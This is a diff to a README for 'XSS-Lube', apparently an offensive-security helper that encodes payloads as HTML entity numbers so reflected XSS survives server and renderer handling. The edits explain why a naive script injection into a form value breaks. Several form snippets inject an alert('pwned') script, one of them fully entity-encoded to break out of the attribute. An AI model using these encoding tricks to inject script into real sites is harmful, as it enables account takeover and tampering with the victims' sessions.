@@ -8,28 +8,30 @@ At times it can be quite challenging to inject XSS code when the code's contents
 To date, this has been tested against PHP servers where form data is reflected on POST. Additional uses are yet to be tested.
 
 ### Example Problem
+This code will break due to the combination of use of several reserved characters and some code being interpreted as a string literal. 
 ```html
 <form action="/action_page.php" method="POST">
     <input id="password" name="password" type="password" value="<script>alert("pwned");</script>" />
     <input type="submit" value="Submit">
 </form>
 ```
-The above will break due to the use of several reserved characters. But, below will work to a limited degree, but only if you're directly manipulating the page. Otherwise, the injected script will not be received as input to the server and reflected back as `value=""/>` will be render before the script is reached and you'll only post an empty string.
+The below will work to a limited degree, but only if you're directly manipulating the page. Otherwise, the injected script will not be received as input to the server and reflected back. This is becuase `...value=""/>` will be rendered literally before the script is reached and you'll only post an empty string to the server. 
 ```html
 <form action="/action_page.php" method="POST">
     <input id="password" name="password" type="password" value=""/><script>alert("pwned");</script>"/>
     <input type="submit" value="Submit">
 </form>
 ```
-
-One can manually fiddle with these inputs by mapping out characters to their HTML Number Entities. For example: 
+What we need is to send a string literal to the server that when reflected will be a complete set of generated code characters. One can manually fiddle with these inputs by mapping out characters to their HTML Number Entities. For example: 
 ```html
 <form action="/action_page.php" method="POST">
     <input id="password" name="password" type="password" value=&#34;&#47;&#62;&#13;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#13;&#32;&#32;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#112;&#119;&#110;&#101;&#100;&#33;&#34;&#41;&#59;&#13;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#13;&#60;&#13;/>
     <input type="submit" value="Submit">
 </form>
 ```
-But that's quite tedious for longer programs. Ideally, you'll get your exploit working with minimal struggle with string manipulation so you can save your time working out bigger problems.
+This should work, and when reflected and re-rendered these HTML Entity Numbers will be translated into HTMl characters. 
+
+But that's quite tedious, especially for longer programs. Ideally, you'll get your reflected XSS exploit working with minimal struggle in the domain of string manipulation so you can save your time working out other technical problems.
 
 ## XSS-Lube to the Rescue
 This tool will take a cleverly crafted text document and convert it's contents into [HTML Entity](https://developer.mozilla.org/en-US/docs/Glossary/Entity) Numbers, thereby circumventing some cases in which otherwise valid exploits are hampered by how a character is handled by the server or HTML renderer.
